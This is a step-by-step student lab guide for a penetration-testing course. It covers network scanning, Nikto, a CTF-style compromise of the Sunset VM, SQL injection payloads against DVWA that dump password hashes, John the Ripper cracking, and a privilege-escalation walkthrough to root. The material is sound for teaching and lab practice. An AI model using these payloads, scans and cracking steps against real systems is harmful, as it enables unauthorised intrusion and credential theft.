# Vulnerability Assessment & Penetration Testing Lab Guide
### BICL606 — Beginner Step-by-Step Guide

> **Environment:** Kali Linux (VirtualBox)  
> **Run all terminal commands as root** — use `sudo su -` to become root first.

---

## Experiment 1: Network Reconnaissance & Footprinting

### What is this?
We find live devices on the network, scan their open ports, identify services/OS, and enumerate subdomains of an external domain using Amass.

---

### Part A – Internal Network Scanning (Nmap)

**Step 1 – Open Terminal and become root**
```bash
sudo su -
```

**Step 2 – Find your own IP address**
```bash
ip a
```
Note your IPv4 address (e.g., `192.168.1.3`) and subnet mask. Calculate CIDR (e.g., `255.255.255.0` → `/24`).

**Step 3 – Discover live hosts in the network**
```bash
nmap -sn 192.168.1.1
```
This does a ping scan — shows which hosts are up without scanning ports.

**Step 4 – Pick a live host and do a detailed scan**
```bash
nmap -sS -sV -O 192.168.1.1
```
- `-sS` → SYN (stealth) scan
- `-sV` → Detect service versions
- `-O` → Guess the operating system

This gives you: open ports, running services, and guessed OS.

**Step 5 – Aggressive scan on the whole subnet**
```bash
nmap -A 192.168.1.0/24
```
- `-A` → OS detection + version detection + scripts + traceroute

---

### Part B – External Reconnaissance (Amass)

**Step 1 – Check if Amass is installed**
```bash
amass -version
```
If not installed:
```bash
apt install amass -y
```

**Step 2 – Run subdomain enumeration on a domain**
```bash
amass enum -d microsoft.com
```
Wait for results. You will see subdomains, IPs, ASN numbers, and hosting provider details.

**Step 3 – Note down the output**
Record the subdomains, their IPs, and which provider hosts them.

---

### Expected Result
Internal devices mapped with ports, services, and OS info. External domain subdomains listed with IP and ASN details.

---

---

## Experiment 2: Vulnerability Scanning & Assessment

### What is this?
We use Nikto to scan the DVWA web application and find misconfigurations, dangerous paths, and outdated software.

> **Pre-requirement:** DVWA must be running. If not set up yet, complete **Experiment 4 Steps 1–12** first, then come back here.

---

### Steps

**Step 1 – Open Firefox and confirm DVWA is accessible**
```
http://127.0.0.1/DVWA
```

**Step 2 – Open Terminal and run Nikto**
```bash
nikto -h http://127.0.0.1/DVWA/
```
Wait ~1 minute. Findings will scroll in the terminal.

**Step 3 – Note the paths Nikto reports**

For example:
- `/DVWA/config/`
- `/DVWA/tests/`
- `/DVWA/login.php`

**Step 4 – Test those paths in the browser**

Append each path to the base URL:
```
http://127.0.0.1/DVWA/config/
http://127.0.0.1/DVWA/tests/
```
You will see directory listings — confirming directory indexing is enabled (a vulnerability).

---

### Expected Result
Nikto reports server version, missing headers, open directories, admin login page, PHP backdoor paths. Verified in browser.

---

---

## Experiment 3: Exploiting a Known Vulnerability

### What is this?
We use netdiscover to find a target (Sunset machine), scan it with Nmap, exploit anonymous FTP to download a password hash, crack it with John the Ripper, and log in via SSH.

> **Pre-requirement:** Both **Sunset** and **Kali** machines must be running in VirtualBox.

---

### Steps

**Step 1 – Network Discovery**
```bash
netdiscover
```
Wait for ARP packets. Look for the machine labelled **PCS System** under hostname — that is your target. Note its IP (e.g., `192.168.1.104`). Press `Ctrl+C` to stop.

**Step 2 – Port and Service Scan**
```bash
nmap -A -p- 192.168.1.104
```
Confirm open ports:
- Port **21** — FTP (vsftpd 2.3.4)
- Port **22** — SSH (OpenSSH)

**Step 3 – FTP Anonymous Login**
```bash
ftp 192.168.1.104
```
When prompted:
```
Username: anonymous
Password: (press Enter — leave blank)
```

**Step 4 – List and download the backup file**
```bash
ls
get backup
exit
```

**Step 5 – View the backup file**
```bash
cat backup
```
You will see a password hash inside.

**Step 6 – Save the hash to a file**
```bash
nano sunset.txt
```
Paste the hash content. Save: `Ctrl+O` → Enter → `Ctrl+X`

**Step 7 – Crack the password**
```bash
john sunset.txt
```
The cracked password will be shown (e.g., `cheer14` for user `sunset`).

**Step 8 – SSH into the target**
```bash
ssh sunset@192.168.1.104
```
Enter the cracked password when prompted.

---

### Expected Result

| Step | Result |
|---|---|
| Nmap | FTP port 21 open, vsftpd 2.3.4 |
| FTP anonymous login | Connected, `backup` file downloaded |
| John the Ripper | Password cracked: `cheer14` |
| SSH login | Successfully logged in as `sunset` |

---

---

## Experiment 4: SQL Injection Attacks on Web Applications

### What is this?
We set up DVWA, then use SQL injection in the browser to extract database version, table names, and user credentials.

---

### Part A – DVWA Setup (One-time)

**Step 1 – Clone DVWA and move to web folder**
```bash
sudo su -
git clone https://github.com/digininja/DVWA.git
mv DVWA /var/www/html
cd /var/www/html
ls
```
You should see: `DVWA  index.html  index.nginx-debian.html`

**Step 2 – Start Apache**
```bash
service apache2 start
```

**Step 3 – Copy the config file**
```bash
cd /var/www/html/DVWA
cp config/config.inc.php.dist config/config.inc.php
```

**Step 4 – Start MySQL**
```bash
sudo systemctl start mysql
```
If you see an error about `meriadb`, ignore it and use the command above.

**Step 5 – Check MySQL is running**
```bash
sudo systemctl status mysql
```
Press `q` to exit.

**Step 6 – Open MySQL shell**
```bash
mysql
```
You will see the `MariaDB [(none)]>` prompt.

**Step 7 – Create database and user (run these one by one)**
```sql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
exit
```

**Step 8 – Edit DVWA config**
```bash
sudo nano /var/www/html/DVWA/config/config.inc.php
```
Update these lines:
```
$_DVWA['db_user'] = 'dvwa';
$_DVWA['db_password'] = 'password';
$_DVWA['db_database'] = 'dvwa';
```
Save: `Ctrl+X` → `Y` → `Enter`

**Step 9 – Restart services**
```bash
sudo systemctl restart apache2
sudo systemctl restart mysql
```

**Step 10 – Open DVWA setup in browser**
```
http://localhost/DVWA/setup.php
```
Scroll to the bottom → Click **"Create / Reset Database"**
Login when prompted: `admin` / `password`

You will now see the full DVWA dashboard.

---

### Part B – SQL Injection

**Step 11 – Set Security Level to Low**
- Click **DVWA Security** in the left panel.
- Set level to **Low** → Click Submit.

**Step 12 – Click "SQL Injection" in the left panel**

**Step 13 – Basic test: enter `1` in User ID → Submit**
A name should be returned — field is working.

**Step 14 – Inject: show all users**
```
%' or '0'='0
```
Returns ALL users. Equivalent SQL:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '%' OR '0'='0';
```

**Step 15 – Inject: show database version**
```
%' or 0=0 union select null,version() #
```
The MySQL version number appears in the Surname field.

**Step 16 – Inject: show all tables in information_schema**
```
%' and 1=0 union select null,table_name from information_schema.tables #
```
Lists all tables in the MySQL information_schema database.

---

### Expected Result
All users returned, DB version revealed, table names from information_schema listed.

---

---

## Experiment 6: Password Cracking & Credential Harvesting

### What is this?
We take the MD5 hashes from DVWA SQL injection and crack them using John the Ripper.

---

### Steps

**Step 1 – Get hashes from DVWA (if not done yet)**

In DVWA SQL Injection, enter:
```
' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```
This displays usernames and their MD5 hashes.

**Step 2 – Navigate to John's directory**
```bash
cd /usr/share/john/
```

**Step 3 – Create the hash file**
```bash
nano dvwa_password.txt
```
Type the hashes in `username:hash` format:
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```
Save: `Ctrl+O` → Enter → `Ctrl+X`

**Step 4 – Run John the Ripper**
```bash
john --format=raw-MD5 dvwa_password.txt
```
Wait for it to finish cracking.

**Step 5 – Show cracked passwords**
```bash
john --format=raw-MD5 dvwa_password.txt --show
```

**Step 6 – Print proof (for submission)**
```bash
date
echo "Your Name"
```
Replace `Your Name` with your actual name.

---

### Expected Result
All 5 passwords cracked and displayed in plaintext.

---

---

## Experiment 8: Privilege Escalation on a Compromised Host

### What is this?
We scan a target, find open ports, discover hidden text files on the web server, SSH in, use steganography to extract hidden credentials, and escalate to root.

> **Pre-requirement:** Target machine (192.168.1.104) must be running in VirtualBox.

---

### Steps

**Step 1 – Nmap scan on target**
```bash
nmap -p- -A 192.168.1.104
```
Port **22 (SSH)** and port **80 (HTTP)** are open.

**Step 2 – Open target web page in browser**
```
http://192.168.1.104
```
You see the Apache2 default page — not useful yet.

**Step 3 – Enumerate hidden .txt files**
```bash
dirb http://192.168.1.104/ -X .txt
```
This finds all `.txt` files on the server.

**Step 4 – Read notes.txt in browser**
```
http://192.168.1.104/notes.txt
```
Output:
```
1- i should finish my second lab
2- i should delete the remb.txt file and remb2.txt
```

**Step 5 – Get the first flag**
```
http://192.168.1.104/remb.txt
```
Output:
```
first_stage:flagitifyoucan1234
```
SSH credentials: user = `first_stage`, password = `flagitifyoucan1234`

**Step 6 – SSH into the target**
```bash
ssh first_stage@192.168.1.104
```
Password: `flagitifyoucan1234`

**Step 7 – Explore the system**
```bash
ls
cat user.txt
cd /home
ls
cd mhz_c1f
ls
cd Paintings
ls
```

**Step 8 – Copy the Paintings folder to Kali (open a NEW terminal on Kali)**
```bash
mkdir raj
cd raj
scp first_stage@192.168.1.104:/home/mhz_c1f/Paintings/* .
ls
```
Enter SSH password when prompted.

**Step 9 – Extract hidden data from image**
```bash
steghide extract -sf "spinning the wool.jpeg"
```
Press Enter when asked for passphrase (or try `flagitifyoucan1234`).

**Step 10 – Read extracted file**
```bash
cat remb2.txt
```
Output:
```
ooh, i know should delete this, but i cant remember it
screw me
mhz_c1f:1@ec1f
```
New credentials: user = `mhz_c1f`, password = `1@ec1f`

**Step 11 – Switch to the new user**
```bash
su mhz_c1f
```
Password: `1@ec1f`

**Step 12 – Check user privileges**
```bash
id
```
User is in the **sudo** group — can become root.

**Step 13 – Escalate to root**
```bash
sudo su
```
Password: `1@ec1f`

**Step 14 – Read the root flag**
```bash
cd /root
ls -la
cat .root.txt
```
Output:
```
OwO HACKER MAN :D
Well done sir, you have successfully got the root flag.
#mhz_cyber
```
**Root access achieved!** 🏆

---

### Expected Result
Full root access obtained via: web enumeration → SSH → steganography → sudo privilege escalation.

---

---

## Experiment 9: Full Web Application Penetration Test (OWASP ZAP)

### What is this?
We use OWASP ZAP to automatically spider and scan OWASP Juice Shop for vulnerabilities like XSS, SQL injection, broken authentication, and insecure direct object references.

---

### Part A – Install OWASP ZAP

**Option 1 – Via terminal (easiest)**
```bash
sudo apt update
sudo apt install zaproxy -y
```

**Option 2 – Via installer download**
- Go to `www.zaproxy.org` → Download → Select **Linux Installer**
- Then in terminal:
```bash
cd Downloads
ls
chmod o+x ZAP_*.sh
./ZAP_*.sh
```
Follow: Next → Install.

---

### Part B – Run Automated Scan

**Step 1 – Launch ZAP**
```bash
zaproxy
```
Or: Kali Menu → Web Application Analysis → OWASP ZAP

**Step 2 – Start a new session**
When prompted to persist session → click **No**.

**Step 3 – Close the welcome message box if it appears**

**Step 4 – Go to Quick Start tab → Click "Automated Scan"**

**Step 5 – Enter the target URL**
```
http://juice-shop.herokuapp.com
```

**Step 6 – Click "Attack"**
ZAP will spider all pages and then actively scan for vulnerabilities.

**Step 7 – Monitor progress**
Watch the status bar at the bottom.

**Step 8 – Review Alerts**
Click the **Alerts** tab at the bottom.
Double-click any alert to see:
- Vulnerability description
- Affected URL
- Evidence
- Recommended fix

---

### Expected Result
Multiple vulnerabilities detected (XSS, SQLi, missing headers, etc.) listed in the Alerts tab with severity and remediation.

---

---

## Quick Reference – All Commands

| Experiment | Command |
|---|---|
| 1 – Find your IP | `ip a` |
| 1 – Ping scan | `nmap -sn 192.168.1.0/24` |
| 1 – Detailed scan | `nmap -sS -sV -O <IP>` |
| 1 – Aggressive scan | `nmap -A 192.168.1.0/24` |
| 1 – Subdomain enum | `amass enum -d microsoft.com` |
| 2 – Nikto scan | `nikto -h http://127.0.0.1/DVWA/` |
| 3 – Network discover | `netdiscover` |
| 3 – FTP login | `ftp <IP>` → user: anonymous |
| 3 – Crack hash | `john sunset.txt` |
| 3 – SSH login | `ssh sunset@<IP>` |
| 4 – Start Apache | `service apache2 start` |
| 4 – Start MySQL | `sudo systemctl start mysql` |
| 4 – MySQL shell | `mysql` |
| 6 – Crack MD5 | `john --format=raw-MD5 dvwa_password.txt` |
| 6 – Show results | `john --format=raw-MD5 dvwa_password.txt --show` |
| 8 – dirb scan | `dirb http://<IP>/ -X .txt` |
| 8 – SCP copy | `scp user@<IP>:/path/* .` |
| 8 – Steghide | `steghide extract -sf "image.jpeg"` |
| 8 – Escalate | `sudo su` |
| 9 – Launch ZAP | `zaproxy` |
